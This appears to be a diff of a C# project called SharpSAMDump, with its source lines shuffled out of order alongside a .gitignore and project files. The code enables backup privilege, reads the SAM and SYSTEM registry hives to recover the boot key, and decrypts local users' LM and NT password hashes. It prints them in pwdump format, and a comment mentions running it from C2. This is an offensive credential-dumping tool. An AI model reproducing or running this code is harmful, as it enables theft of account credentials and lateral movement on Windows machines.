@@ -1,0 +1,1137 @@
+        
+            
+                
+                   
+                        break
+                        byte b = bytes[i 
+                        continue
+                        line[charColumn] = ' '
+                        line[charColumn] = AsciiSymbol(b)
+                        line[hexColumn 
+                        line[hexColumn] = ' '
+                        line[hexColumn] = HexChars[(b >> 4) 
+                        return false
+                        retval = true
+                        throw new Win32Exception()
+                        using (RegistryKey userKey = usersKey.OpenSubKeyForBackup(subkey))
+                        {
+                        }
+                    (REG_VALUE_TYPE
+                    LUID_AND_ATTRIBUTES privilege = tokenPrivileges.Privileges[index]
+                    Marshal.FreeHGlobal(tokenInformation)
+                    T[_] = key[_ % key.Length]
+                    _Header = Marshal.PtrToStructure<Header>(new IntPtr(pdata))
+                    charColumn
+                    className = new string(buffer)
+                    else
+                    hexColumn 
+                    if (!a1[i].Equals(a2[i]))
+                    if ((WIN32_ERROR)Marshal.GetLastWin32Error() != WIN32_ERROR.ERROR_INSUFFICIENT_BUFFER)
+                    if (i 
+                    if (j > 0 
+                    if (privilege.Luid.Equals(luid) 
+                    lmHash = blankLM
+                    ntHash = blankNT
+                    null
+                    out hRegistry)
+                    privilegeName = new string(buffer)
+                    return false
+                    scrambledKeyString 
+                    throw new Win32Exception((int)error)
+                    throw new Win32Exception()
+                    try
+                    {
+                    }
+                    } catch (Win32Exception)
+                  // 2 spaces 
+                  // 3 spaces
+                  8                   // 8 characters for the address
+                )
+                //                     at 0 once we go beyond 255 (this is done with mod (%) division
+                //                     encrypting) or plaintext (when decrypting)
+                //                     produce  the next byte of the resulting ciphertext (when 
+                //                     result within the range of 0 to 255 using mod (%) division
+                //                     to get the index of S that handls the value of the stream value K.
+                //  PRGA Phase Step 3. Swap the values of S[i] and S[j]
+                //  PRGA Phase Step 5. Use bitwise exclusive OR (
+                //  Swap the values of S[i] and S[j]
+                //  fill T
+                //  range of 0 to 255 using mod (%) division.
+                Attributes = enabled 
+                Console.WriteLine(ex.StackTrace)
+                Console.WriteLine(ex.ToString())
+                Debug.Assert(byte.MinValue <= keyByte 
+                IntPtr tokenInformation = Marshal.AllocHGlobal((int)returnLength)
+                Marshal.FreeHGlobal(tokenInformation)
+                SAMDump()
+                S[_] = _
+                S[i] = S[j]
+                S[j] = temp
+                WIN32_ERROR error = PInvoke.RegOpenKeyEx(
+                WIN32_ERROR error = PInvoke.RegQueryValueEx(
+                _Data = new byte[dataLength]
+                aes.IV = iv
+                aes.Key = key
+                aes.Mode = CipherMode.CBC
+                aes.Padding = PaddingMode.PKCS7
+                arr[i] = (byte)((GetHexVal(hex[i << 1]) << 4) 
+                b 
+                byte[] lmHash = new byte[_Header.LMHashLength]
+                byte[] ntHash = new byte[_Header.NTHashLength]
+                case EncryptionType.AES:
+                case EncryptionType.RC4:
+                default:
+                des.Key = key
+                des.Mode = CipherMode.ECB
+                des.Padding = PaddingMode.None
+                fixed (byte
+                fixed (char
+                for (int _ = 0
+                for (int i = 0
+                for (int index = 0
+                for (int j = 0
+                foreach (string subkey in subkeys)
+                i = (i 
+                if (a1.Length != a2.Length)
+                if (error != WIN32_ERROR.ERROR_SUCCESS)
+                if (error != WIN32_ERROR.NO_ERROR)
+                if (lmHash == null)
+                if (ntHash == null)
+                int K = S[(S[i] 
+                int b = curr
+                int charColumn = firstCharColumn
+                int curr = (int)(k >> (7 
+                int hexColumn = firstHexColumn
+                int j = 7 - i
+                int keyByte = (curr << 1) 
+                int temp = S[i]
+                j = (j 
+                keyBytes[i] = scrambledKeyBytes[indices[i]]
+                key[i] = (byte)keyByte
+                line[0] = HexChars[(i >> 28) 
+                line[1] = HexChars[(i >> 24) 
+                line[2] = HexChars[(i >> 20) 
+                line[3] = HexChars[(i >> 16) 
+                line[4] = HexChars[(i >> 12) 
+                line[5] = HexChars[(i >> 8) 
+                line[6] = HexChars[(i >> 4) 
+                line[7] = HexChars[(i >> 0) 
+                offset 
+                result.Append(line)
+                result[iteration] = Convert.ToByte(data[iteration] 
+                return lmHash
+                return ntHash
+                return null
+                return true
+                size 
+                string[] subkeys = usersKey.GetSubKeyNames()
+                throw new Win32Exception()
+                uint bufferSize = 256
+                uint returnLength
+                {
+                }
+            //                    in ascending order.
+            //  KSA Phase Step 3: We use T to produce the initial permutation of S ...
+            //  Key Scheduling Algorithm Phase:
+            //  Pseudo random generation algorithm (Stream Generation):
+            //  return the result
+            // Handle the hole in Latin-1
+            // no wrapping in debug mode so that exceptions are caught by the debugger
+            // try-catch wrapped execution for invocations from C2
+            Debug.Assert(len > 0)
+            LUID luid
+            LUID luid = LookupPrivilegeLUID(name)
+            LUID_AND_ATTRIBUTES privileges = new LUID_AND_ATTRIBUTES()
+            List<SAMEntry> entries = new List<SAMEntry>()
+            Privileges.EnablePrivilege(Privileges.SeBackupPrivilege)
+            Rid = rid
+            SAMDump()
+            SAMDumpIgnoringExceptions()
+            SafeFileHandle hProcess = PInvoke.GetCurrentProcess_SafeHandle()
+            SafeFileHandle hToken
+            SafeFileHandle hToken = GetCurrentProcessToken(TOKEN_ACCESS_MASK.TOKEN_ADJUST_PRIVILEGES 
+            SafeFileHandle hToken = GetCurrentProcessToken(TOKEN_ACCESS_MASK.TOKEN_QUERY)
+            SafeRegistryHandle hRegistry
+            StringBuilder result = new StringBuilder(expectedLines 
+            TOKEN_PRIVILEGES tokenPrivileges = new TOKEN_PRIVILEGES()
+            T[] dest = new T[size]
+            [FieldOffset(0x0c)]
+            [FieldOffset(0x10)]
+            [FieldOffset(0x18)]
+            [FieldOffset(0x1c)]
+            [FieldOffset(0x24)]
+            [FieldOffset(0x28)]
+            [FieldOffset(0x48)]
+            [FieldOffset(0x4c)]
+            [FieldOffset(0x60)]
+            [FieldOffset(0x64)]
+            [FieldOffset(0x9c)]
+            [FieldOffset(0xa0)]
+            [FieldOffset(0xa8)]
+            [FieldOffset(0xac)]
+            [FieldOffset(0xc4)]
+            bool retval = false
+            byte[] actualHash = MD5.Create().ComputeHash(hashMaterial)
+            byte[] actualHash = SHA256.Create().ComputeHash(pek)
+            byte[] arr = new byte[hex.Length >> 1]
+            byte[] ciphertext = new byte[data.Length - 24]
+            byte[] ciphertext = new byte[encLen]
+            byte[] ciphertext = new byte[length]
+            byte[] data = BitConverter.GetBytes(rid)
+            byte[] data = new byte[len]
+            byte[] data16Bytes = new byte[16]
+            byte[] hash = new byte[16]
+            byte[] hashData = new byte[hashLen]
+            byte[] iv
+            byte[] iv = new byte[16]
+            byte[] kBytes = new byte[8]
+            byte[] key = new byte[8]
+            byte[] keyBytes = new byte[indices.Length]
+            byte[] lsaKey = LSA.GetSecretKey()
+            byte[] pek = new byte[16]
+            byte[] rc4Key = MD5.Create().ComputeHash(rc4KeyMaterial)
+            byte[] result = new byte[data.Length]
+            byte[] samKey = SAM.GetEncryptedPasswordEncryptionKey()
+            byte[] scrambledKeyBytes = Util.FromHexString(scrambledKeyString)
+            catch (Exception ex)
+            else
+            for (i = 0
+            for (int _ = 0
+            for (int i = 0
+            for (int i=0
+            for (int iteration = 0
+            foreach (SAMEntry entry in SAM.GetEntries())
+            foreach (T[] array in arrays)
+            foreach (string name in names)
+            get
+            i = j = 0
+            if ((a1 != null) 
+            if (a1 == a2)
+            if (data == null)
+            if (data.Length < 0x14)
+            if (dataLength > 0)
+            if (dec == null)
+            if (hex.Length % 2 == 1)
+            if (key.Length == 256)
+            if (length == 0)
+            if (val < 127) return (char)val
+            if (val < 32) return '.'
+            if (val == 0xAD) return '.'
+            if (val == 127) return '.'
+            int bytesLength = bytes.Length
+            int dataLength = data.Length - Header.DataOffset
+            int expectedLines = (bytesLength 
+            int firstCharColumn = firstHexColumn
+            int firstHexColumn =
+            int i = 0
+            int j = 0
+            int kind = 0
+            int len = endofs - 0x70
+            int lineLength = firstCharColumn
+            int offset = 0
+            int size = 0
+            int val = hex
+            int[] S = new int[256]
+            int[] T = new int[256]
+            internal int AccountNameLength
+            internal int AccountNameOffset
+            internal int CommentLength
+            internal int CommentOffset
+            internal int CompleteAccountNameLength
+            internal int CompleteAccountNameOffset
+            internal int HashHistoryCount
+            internal int HomeDirLength
+            internal int HomeDirOffset
+            internal int LMHashLength
+            internal int LMHashOffset
+            internal int NTHashLength
+            internal int NTHashOffset
+            internal int ScriptPathLength
+            internal int ScriptPathOffset
+            public static int DataOffset = 0xcc
+            return (char)val
+            return RegistryKey.FromHandle(hRegistry)
+            return arr
+            return className
+            return dest
+            return entries.ToArray()
+            return false
+            return hToken
+            return hash
+            return key
+            return keyBytes
+            return kind
+            return luid
+            return pek
+            return privilegeName
+            return result
+            return result.ToString()
+            return retval
+            return upperCase 
+            return val - (val < 58 
+            switch (encryptionType)
+            switch (type)
+            tokenPrivileges.PrivilegeCount = 1
+            tokenPrivileges.Privileges.e0 = privileges
+            try
+            uint bufferSize = 256
+            unsafe
+            using (Aes aes = Aes.Create())
+            using (DES des = DES.Create()) {
+            {
+            { 
+            }
+        // from: https://stackoverflow.com/a/26206519
+        // from: https://stackoverflow.com/a/623184
+        // from: https://stackoverflow.com/a/9995303
+        ///     Byte array representing the data to be encrypted/decrypted
+        ///     Byte array representing the encrypted/decrypted data.
+        ///     Byte array representing the key to use
+        ///     https://en.wikipedia.org/wiki/RC4
+        ///     which means this single method will work for encrypting and decrypting.
+        /// </param>
+        /// </remarks>
+        /// </returns>
+        /// </summary>
+        /// <remarks>
+        /// <returns>
+        /// <summary>
+        [StructLayout(LayoutKind.Explicit)]
+        private Header _Header
+        private byte[] _Data
+        private enum EncryptionType : short
+        private enum HashType
+        private static LUID LookupPrivilegeLUID(string name)
+        private static SafeFileHandle GetCurrentProcessToken(TOKEN_ACCESS_MASK accessMask)
+        private static byte[] DeriveDESKey(byte[] data)
+        private static char AsciiSymbol(byte val)
+        private static int GetHexVal(char hex)
+        private static string LookupPrivilegeName(LUID luid)
+        private static void SAMDumpIgnoringExceptions()
+        private struct Header
+        public byte[] EncryptedLMHash
+        public byte[] EncryptedNTHash
+        public readonly uint Rid
+        public static SAMEntry GetEntry(uint rid)
+        public static SAMEntry[] GetEntries()
+        public static T[] ConcatArrays<T>(params T[][] arrays)
+        public static bool IsPrivilegeEnabled(string name)
+        public static byte[] FromHexString(string hex)
+        public static byte[] GetEncryptedPasswordEncryptionKey()
+        public static byte[] GetSecretKey()
+        public static string GetClassName(this RegistryKey key)
+        public static void Main(string[] args)
+        public static void SAMDump()
+        public string AccountName
+        public string Comment
+        public string FullAccountName
+        public string HomeDirectory
+        public string ScriptPath
+        {
+        }
+      </dependentAssembly>
+      <HintPath>packages
+      <dependentAssembly>
+    </NuGetPackageImportStamp>
+    </PropertyGroup>
+    </Reference>
+    </assemblyBinding>
+    </startup>
+    <AssemblyName>SharpSAMDump</AssemblyName>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DebugType>pdbonly</DebugType>
+    <DefineConstants>DEBUG
+    <DefineConstants>TRACE</DefineConstants>
+    <Deterministic>true</Deterministic>
+    <ErrorReport>prompt</ErrorReport>
+    <FileAlignment>512</FileAlignment>
+    <LangVersion>9</LangVersion>
+    <NuGetPackageImportStamp>
+    <Optimize>false</Optimize>
+    <Optimize>true</Optimize>
+    <OutputPath>bin
+    <OutputType>Exe</OutputType>
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <Prefer32Bit>false</Prefer32Bit>
+    <ProjectGuid>{4FEAB888-F514-4F2E-A4F7-5989A86A69DE}</ProjectGuid>
+    <PropertyGroup>
+    <RootNamespace>SharpSAMDump</RootNamespace>
+    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <WarningLevel>4</WarningLevel>
+    <startup> 
+    internal class Privileges
+    internal static class Crypto
+    internal static class RC4
+    internal static class Util
+    public class Program
+    public class SAMEntry
+    public static class LSA
+    public static class RegistryExtension
+    public static class SAM
+    {
+    { 
+    }
+   // Normal ASCII
+   // Normal Latin-1
+   // Soft hyphen: this symbol is zero-width even in monospace fonts
+  // Non-printable ASCII
+  </ItemGroup>
+  </PropertyGroup>
+  </Target>
+  </runtime>
+  <ItemGroup>
+  <PropertyGroup>
+  <runtime>
+ !tools/packages.config
+ (GetHexVal(hex[(i << 1) 
+ (a2 != null))
+ (b 
+ (bytesPerLine - 1) / 8 // - 1 extra space every 8 characters from the 9th
+ (https://github.com/github/gitignore/pull/1529
+ (https://github.com/github/gitignore/pull/2483
+ (j 
+ (privilege.Attributes 
+ .NET Core
+ // Carriage return and line feed (should normally be 2)
+ 0x68
+ 0x7F
+ 0xF]
+ 1) 
+ 1) % 256
+ 1] = ' '
+ 1] = HexChars[b 
+ 1])))
+ 3       // - 2 digit for the hexadecimal value and 1 space
+ 48 : (val < 97 
+ 55 : 87))
+ 7) == 0) hexColumn
+ ASP.NET Scaffolding
+ AxoCover is a Code Coverage Tool
+ Azure Stream Analytics local run output
+ Backup 
+ Backup folder for Package Reference Convert tool in Visual Studio 2017
+ BeatPulse healthcheck temp database
+ Benchmark Results
+ BizTalk build output
+ Build Results of an ATL Project
+ Build results
+ Business Intelligence projects
+ Cake - Uncomment if you are using it
+ Chutzpah Test files
+ Click-Once directory
+ CodeRush personal settings
+ DocProject is a documentation generator add-in
+ DotCover is a Code Coverage Tool
+ Environment.NewLine).ToCharArray()
+ Environment.NewLine.Length
+ FAKE - F
+ Files built by Visual Studio
+ Files/
+ Fody - auto-generated XML schema
+ Get latest from https://github.com/github/gitignore/blob/main/VisualStudio.gitignore
+ GhostDoc plugin setting file
+ Guidance Automation Toolkit
+ Including strong name files can present a security risk
+ Installshield output folder
+ Ionide (cross platform F
+ JetBrains Rider
+ Local History for Visual Studio
+ Local History for Visual Studio Code
+ MFractors (Xamarin productivity tool) working folder
+ MSBuild Binary and Structured Log
+ MSTest test Results
+ Make
+ Microsoft Azure Build Output
+ Microsoft Azure Emulator
+ Microsoft Azure Web App publish settings. Comment the next line if you want to
+ Microsoft Fakes
+ MightyMoose
+ Mono auto generated files
+ NCrunch
+ NUnit
+ NVidia Nsight GPU debugger configuration file
+ Node.js Tools for Visual Studio
+ NuGet Packages
+ NuGet Symbol Packages
+ NuGet v3's project.json files produces more ignorable files
+ OpenCover UI analysis results
+ Others
+ Paket dependency manager
+ Publish Web Output
+ Python Tools for Visual Studio (PTVS)
+ RIA/Silverlight projects
+ ReSharper is a .NET coding add-in
+ SQL Server files
+ S[i] 
+ S[i]) % 256
+ S[j]) % 256]
+ SharpSAMDump
+ StyleCop
+ TFS 2012 Local Workspace
+ TOKEN_ACCESS_MASK.TOKEN_QUERY)
+ TOKEN_PRIVILEGES_ATTRIBUTES.SE_PRIVILEGE_ENABLED) != 0)
+ T[i]) % 256
+ Tabs Studio
+ TeamCity is a build add-in
+ Telerik's JustMock configuration file
+ The packages folder can be ignored because of Package Restore
+ Uncomment if necessary however generally it will be regenerated when needed
+ Uncomment if you have tasks that create the project's static files in wwwroot
+ User-specific files
+ User-specific files (MonoDevelop/Xamarin Studio)
+ VS Code files for those working on multiple tools
+ VS Code tools) working folder
+ Visual C
+ Visual Studio 2015/2017 cache/options directory
+ Visual Studio 2017 auto generated files
+ Visual Studio 6 auto-generated project file (contains which files were open etc.)
+ Visual Studio 6 auto-generated workspace file (contains which files were open etc.)
+ Visual Studio 6 build log
+ Visual Studio 6 technical files
+ Visual Studio 6 workspace and project file (working project files containing files to include in project)
+ Visual Studio 6 workspace options file
+ Visual Studio History (VSHistory) files
+ Visual Studio LightSwitch build output
+ Visual Studio Trace Files
+ Visual Studio Version 17
+ Visual Studio cache files
+ Visual Studio code coverage results
+ Visual Studio profiler
+ Web workbench (sass)
+ Windows Installer files from build outputs
+ Windows Store app package directories and files
+ _ < 256
+ because we have git 
+ break
+ buffer = new char[bufferSize])
+ but database connection strings (with potential passwords) will be unencrypted
+ but keep track of directories ending in .cache
+ bytesPerLine 
+ bytesPerLine           // - characters to show the ascii value
+ bytesPerLine - 1) / bytesPerLine
+ cache files
+ files ending in .cache can be ignored
+ files generated by popular Visual Studio add-ons.
+ hexString.ToUpper() : hexString.ToLower()
+ i < 256
+ i < 8
+ i < a1.Length
+ i < bytesLength
+ i < hex.Length >> 1
+ i<indices.Length
+ in these scripts will be unencrypted
+ index
+ index < tokenPrivileges.PrivilegeCount
+ iteration
+ iteration < data.Length
+ j < bytesPerLine
+ j >= bytesLength)
+ j)) 
+ keyByte <= byte.MaxValue)
+ lineLength)
+ pdata = 
+ report files from converting an old project file
+ tools/
+!.axoCover/settings.json
+!.vscode/extensions.json
+!.vscode/launch.json
+!.vscode/settings.json
+!.vscode/tasks.json
+"                            byte[] data = (byte[])userKey.GetValue(""V"")"
+"                            entries.Add(new SAMEntry(rid, data))"
+"                    (uint)REG_OPEN_CREATE_OPTIONS.REG_OPTION_BACKUP_RESTORE,"
+"                    PInvoke.LookupPrivilegeName(null, luid, buffer, ref bufferSize)"
+"                    PInvoke.RegQueryInfoKey(key.Handle, buffer, "
+"                    REG_SAM_FLAGS.KEY_READ,"
+"                    if (subkey == ""Names"")"
+"                    key.Handle,"
+"                    name,"
+"                    null,"
+"                    return UnprotectPasswordEncryptionKeyAES(data, lsaKey)"
+"                    return UnprotectPasswordEncryptionKeyRC4(data, lsaKey)"
+"                    return UnprotectPasswordHashAES(key, data)"
+"                    return UnprotectPasswordHashRC4(key, data, rid, type)"
+"                    throw new ArgumentException($""unknown encryption type {encryptionType}"")"
+"                    throw new ArgumentException($""unknown type {type}"")"
+"                    uint rid = Convert.ToUInt32(subkey, 16)"
+"                //  Otherwise, for a key with a given length, copy the elements of"
+"                //  PRGA Phase Step 1. Continously increment i from 0 to 255, starting it back "
+"                //  PRGA Phase Step 2. Lookup the i'th element of S and add it to j, keeping the"
+"                //  PRGA Phase Step 4. Use the result of the sum of S[i] and S[j], mod (%) by 256, "
+"                //  increment j by the sum of S[i] and T[i], however keeping it within the "
+"                //  the key into vector T, repeating for as many times as neccessary to"
+"                Array.Copy(_Data, _Header.LMHashOffset, lmHash, 0, _Header.LMHashLength)"
+"                Array.Copy(_Data, _Header.NTHashOffset, ntHash, 0, _Header.NTHashLength)"
+"                Array.Copy(data, Header.DataOffset, _Data, 0, dataLength)"
+"                Buffer.BlockCopy(key, 0, T, 0, key.Length)"
+"                Console.WriteLine($""{entry.AccountName}:{entry.Rid}:{Util.ToHexString(lmHash)}:{Util.ToHexString(ntHash)}:::"")"
+"                Luid = luid,"
+"                TOKEN_PRIVILEGES tokenPrivileges = (TOKEN_PRIVILEGES)Marshal.PtrToStructure(tokenInformation, typeof(TOKEN_PRIVILEGES))"
+"                array.CopyTo(dest, offset)"
+"                byte[] data = (byte[])userKey.GetValue(""V"")"
+"                byte[] lmHash = Crypto.UnprotectNTHash(passwordEncryptionKey, entry.EncryptedLMHash, entry.Rid)"
+"                byte[] ntHash = Crypto.UnprotectNTHash(passwordEncryptionKey, entry.EncryptedNTHash, entry.Rid)"
+"                case HashType.LmPassword: iv = Encoding.ASCII.GetBytes(""LMPASSWORD"
+"                case HashType.LmPasswordHistory: iv = Encoding.ASCII.GetBytes(""LMPASSWORDHISTORY"
+"                case HashType.MiscCredData: iv = Encoding.ASCII.GetBytes(""MISCCREDDATA"
+"                case HashType.NtPassword: iv = Encoding.ASCII.GetBytes(""NTPASSWORD"
+"                case HashType.NtPasswordHistory: iv = Encoding.ASCII.GetBytes(""NTPASSWORDHISTORY"
+"                if (!PInvoke.AdjustTokenPrivileges(hToken, false, "
+"                if (!PInvoke.GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenPrivileges, null, 0, out returnLength))"
+"                if (!PInvoke.GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenPrivileges, tokenInformation.ToPointer(), returnLength, out returnLength))"
+"                return """""
+"                return (byte[])userKey.GetValue(""F"")"
+"                return aes.CreateDecryptor().TransformFinalBlock(ciphertext, 0, ciphertext.Length)"
+"                return des.CreateDecryptor().TransformFinalBlock(ciphertext, offset, 8)"
+"                return new SAMEntry(rid, data)"
+"                throw new Exception(""The binary key cannot have an odd number of digits"")"
+"                throw new Exception(""invalid AES password key"")"
+"                throw new Exception(""invalid RC4 password key"")"
+"                using (RegistryKey key = Registry.LocalMachine.OpenSubKeyForBackup($""SYSTEM"
+"            //  KSA Phase Step 1: First, the entries of S are set equal to the values of 0 to 255 "
+"            //  KSA Phase Step 2a: Next, a temporary vector T is created."
+"            //  KSA Phase Step 2b: If the length of the key k is 256 bytes, then k is assigned to T.  "
+"            //  Once the vector S is initialized from above in the Key Scheduling Algorithm Phase,"
+"            //  the input key is no longer used.  In this phase, for the length of the data, we ..."
+"            AES = 2,"
+"            Array.Copy(data, 0, data16Bytes, 0, 16)"
+"            Array.Copy(data, 0x18 "
+"            Array.Copy(data, 0x18, ciphertext, 0, ciphertext.Length)"
+"            Array.Copy(data, 8 "
+"            Array.Copy(data, 8, iv, 0, iv.Length)"
+"            Array.Copy(data, offset, ciphertext, 0, ciphertext.Length)"
+"            Array.Copy(plaintext, 0, pek, 0, pek.Length)"
+"            Array.Copy(plaintext, pek.Length, hash, 0, hash.Length)"
+"            Array.Copy(samKey, 0x70, data, 0, data.Length)"
+"            EncryptionType encryptionType = (EncryptionType)BitConverter.ToInt16(data, 2)"
+"            EncryptionType encryptionType = (EncryptionType)BitConverter.ToInt32(samKey, 0x68)"
+"            LmPassword = 1,"
+"            LmPasswordHistory = 3,"
+"            MiscCredData = 5,"
+"            NtPassword = 2,"
+"            NtPasswordHistory = 4,"
+"            RC4 = 1,"
+"            Tuple<byte[], byte[]> keys = GetUserDESKeys(rid)"
+"            byte[] blankLM = Util.FromHexString(""aad3b435b51404eeaad3b435b51404ee"")"
+"            byte[] blankNT = Util.FromHexString(""31d6cfe0d16ae931b73c59d7e0c089c0"")"
+"            byte[] dec = UnprotectPasswordHash(key, encryptedHash, rid, HashType.LmPassword)"
+"            byte[] dec = UnprotectPasswordHash(key, encryptedHash, rid, HashType.NtPassword)"
+"            byte[] hash = UnprotectAES(lsaKey, iv, hashData)"
+"            byte[] hash = UnprotectPasswordHashDES(dec, rid)"
+"            byte[] hashMaterial = Util.ConcatArrays(pek, niv, pek, qiv)"
+"            byte[] key1 = DeriveDESKey(new byte[]{ data[2], data[1], data[0], data[3], data[2], data[1], data[0]})"
+"            byte[] key2 = DeriveDESKey(new byte[] { data[1], data[0], data[3], data[2], data[1], data[0], data[3] })"
+"            byte[] niv = Encoding.ASCII.GetBytes(""0123456789012345678901234567890123456789"")"
+"            byte[] passwordEncryptionKey = Crypto.UnprotectPasswordEncryptionKey(samKey, lsaKey)"
+"            byte[] pek = UnprotectAES(lsaKey, iv, ciphertext)"
+"            byte[] plaintext = UnprotectRC4(rc4Key, data, 0x10, 0x20)"
+"            byte[] plaintext1 = UnprotectDES(keys.Item1, ciphertext, 0)"
+"            byte[] plaintext2 = UnprotectDES(keys.Item2, ciphertext, 8)"
+"            byte[] qiv = Encoding.ASCII.GetBytes(""!@"
+"            byte[] rc4KeyMaterial = Util.ConcatArrays(data16Bytes, qiv, lsaKey, niv)"
+"            byte[] rc4KeyMaterial = Util.ConcatArrays(key, BitConverter.GetBytes(rid), iv)"
+"            char[] HexChars = ""0123456789ABCDEF"".ToCharArray()"
+"            char[] line = (new string(' ', lineLength - 2) "
+"            data.CopyTo(kBytes, 0)"
+"            get => Encoding.Unicode.GetString(_Data, _Header.AccountNameOffset, _Header.AccountNameLength)"
+"            get => Encoding.Unicode.GetString(_Data, _Header.CommentOffset, _Header.CommentLength)"
+"            get => Encoding.Unicode.GetString(_Data, _Header.CompleteAccountNameOffset, _Header.CompleteAccountNameLength)"
+"            get => Encoding.Unicode.GetString(_Data, _Header.HomeDirOffset, _Header.HomeDirLength)"
+"            get => Encoding.Unicode.GetString(_Data, _Header.ScriptPathOffset, _Header.ScriptPathLength)"
+"            if (!PInvoke.LookupPrivilegeValue(null, name, out luid))"
+"            if (!PInvoke.OpenProcessToken(hProcess, accessMask, out hToken))"
+"            if (!Util.ArrayEquals(hash, actualHash))"
+"            if (bytes == null) return ""<null>"""
+"            if (val < 0x90) return """
+"            if (val < 0xA0) return ""."
+"            int encLen = BitConverter.ToInt32(data, 4)"
+"            int endofs = BitConverter.ToInt32(samKey, 0x6C) "
+"            int hashLen = BitConverter.ToInt32(data, 0)"
+"            int length = BitConverter.ToInt32(data, 4)"
+"            int[] indices = new int[] { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 }"
+"            return RC4Cryptography.RC4.Apply(data, key)"
+"            return Tuple.Create(key1, key2)"
+"            return UnprotectAES(key, iv, ciphertext)"
+"            return UnprotectRC4(rc4Key, data, 4, 16)"
+"            return Util.ConcatArrays(plaintext1, plaintext2)"
+"            string className = """""
+"            string hexString = BitConverter.ToString(data).Replace(""-"", string.Empty)"
+"            string privilegeName = """""
+"            string scrambledKeyString = """""
+"            string[] names = new string[] { ""JD"", ""Skew1"", ""GBG"", ""Data"" }"
+"            ulong k = BitConverter.ToUInt64(kBytes, 0)"
+"            using (RegistryKey userKey = Registry.LocalMachine.OpenSubKeyForBackup($""SAM"
+"            using (RegistryKey usersKey = Registry.LocalMachine.OpenSubKeyForBackup($""SAM"
+"        ///     Give data and an encryption key, apply RC4 cryptography.  RC4 is symmetric,"
+"        /// <param name=""data"">"
+"        /// <param name=""key"">"
+"        <assemblyIdentity name=""System.Runtime.CompilerServices.Unsafe"" publicKeyToken=""b03f5f7f11d50a3a"" culture=""neutral"" />"
+"        <bindingRedirect oldVersion=""0.0.0.0-6.0.0.0"" newVersion=""6.0.0.0"" />"
+"        <supportedRuntime version=""v4.0"" sku="".NETFramework,Version=v4.7.2"" />"
+"        private static Tuple<byte[], byte[]> GetUserDESKeys(uint rid)"
+"        private static byte[] UnprotectAES(byte[] key, byte[] iv, byte[] ciphertext)"
+"        private static byte[] UnprotectDES(byte[] key, byte[] ciphertext, int offset)"
+"        private static byte[] UnprotectPasswordEncryptionKeyAES(byte[] data, byte[] lsaKey)"
+"        private static byte[] UnprotectPasswordEncryptionKeyRC4(byte[] data, byte[] lsaKey)"
+"        private static byte[] UnprotectPasswordHash(byte[] key, byte[] data, uint rid, HashType type) {"
+"        private static byte[] UnprotectPasswordHashAES(byte[] key, byte[] data)"
+"        private static byte[] UnprotectPasswordHashDES(byte[] ciphertext, uint rid)"
+"        private static byte[] UnprotectPasswordHashRC4(byte[] key, byte[] data, uint rid, HashType type)"
+"        private static byte[] UnprotectRC4(byte[] key, byte[] data, int offset, int length)"
+"        public SAMEntry(uint rid, byte[] data)"
+"        public const string SeBackupPrivilege = ""SeBackupPrivilege"""
+"        public static RegistryKey OpenSubKeyForBackup(this RegistryKey key, string name)"
+"        public static bool ArrayEquals<T>(T[] a1, T[] a2)"
+"        public static byte[] Apply(byte[] data, byte[] key)"
+"        public static byte[] UnprotectLMHash(byte[] key, byte[] encryptedHash, uint rid)"
+"        public static byte[] UnprotectNTHash(byte[] key, byte[] encryptedHash, uint rid)"
+"        public static byte[] UnprotectPasswordEncryptionKey(byte[] samKey, byte[] lsaKey)"
+"        public static int GetValueKindInt(this RegistryKey key, string name)"
+"        public static string HexDump(byte[] bytes, int bytesPerLine = 16)"
+"        public static string ToHexString(byte[] data, bool upperCase = false)"
+"        public static void EnablePrivilege(string name, bool enabled = true)"
+"      <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/"
+"    <Analyzer Include=""packages"
+"    <Compile Include=""Crypto.cs"" />"
+"    <Compile Include=""LSA.cs"" />"
+"    <Compile Include=""Privileges.cs"" />"
+"    <Compile Include=""Program.cs"" />"
+"    <Compile Include=""Properties"
+"    <Compile Include=""RC4.cs"" />"
+"    <Compile Include=""RegistryExtension.cs"" />"
+"    <Compile Include=""SAM.cs"" />"
+"    <Compile Include=""Util.cs"" />"
+"    <Configuration Condition="" '$(Configuration)' == '' "">Debug</Configuration>"
+"    <Content Include=""NativeMethods.txt"" />"
+"    <Error Condition=""!Exists('packages"
+"    <None Include=""App.config"" />"
+"    <None Include=""packages.config"" />"
+"    <Platform Condition="" '$(Platform)' == '' "">AnyCPU</Platform>"
+"    <Reference Include=""Microsoft.CSharp"" />"
+"    <Reference Include=""Microsoft.Windows.SDK.Win32Docs, Version=0.1.42.13748, Culture=neutral, PublicKeyToken=7c40c7c34b1fcfe1, processorArchitecture=MSIL"">"
+"    <Reference Include=""System"" />"
+"    <Reference Include=""System.Buffers, Version=4.0.3.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL"">"
+"    <Reference Include=""System.Core"" />"
+"    <Reference Include=""System.Data"" />"
+"    <Reference Include=""System.Data.DataSetExtensions"" />"
+"    <Reference Include=""System.Memory, Version=4.0.1.2, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL"">"
+"    <Reference Include=""System.Net.Http"" />"
+"    <Reference Include=""System.Numerics"" />"
+"    <Reference Include=""System.Numerics.Vectors, Version=4.1.4.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL"">"
+"    <Reference Include=""System.Runtime.CompilerServices.Unsafe, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL"">"
+"    <Reference Include=""System.Xml"" />"
+"    <Reference Include=""System.Xml.Linq"" />"
+"    <assemblyBinding xmlns=""urn:schemas-microsoft-com:asm.v1"">"
+"  2024"")]"
+"  <Import Project=""$(MSBuildExtensionsPath)"
+"  <Import Project=""$(MSBuildToolsPath)"
+"  <Import Project=""packages"
+"  <PropertyGroup Condition="" '$(Configuration)"
